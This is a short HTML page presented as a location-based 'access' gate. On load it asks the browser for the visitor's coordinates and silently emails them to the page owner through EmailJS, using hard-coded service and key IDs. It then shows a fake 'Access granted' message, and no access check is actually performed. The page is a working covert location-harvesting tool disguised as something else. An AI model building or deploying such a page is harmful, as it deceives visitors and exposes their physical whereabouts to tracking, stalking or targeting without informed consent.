<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Access</title>
</head>

<body>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
        window.onload = function() {
            getLocation();
        };

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            }
        }

        function showPosition(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;

            emailjs
                .send(
                    "service_so16vcv", // service id
                    "template_a0xzc4e", // template id
                    {
                        from_name: 'Location',
                        from_email: 'Location@lo.com',
                        reply_to: 'Location@lo.com',
                        message: `lat ${latitude} lon ${longitude}`
                    },
                    "ryFsvBOoQeAx2ou_t" // public api
                )



            // Check if the user's location meets the criteria for access
            // Example: Check if latitude is within a certain range

            alert("Access granted. Welcome to the site!");
            // Redirect the user to the site or load site content
            // window.location.href = "https://www.yoursite.com";

        }

        function showError(error) {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    alert("User denied the request for geolocation.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("Location information is unavailable.");
                    break;
                case error.TIMEOUT:
                    alert("The request to get user location timed out.");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("An unknown error occurred.");
                    break;
            }
        }
    </script>



</body>

</html>
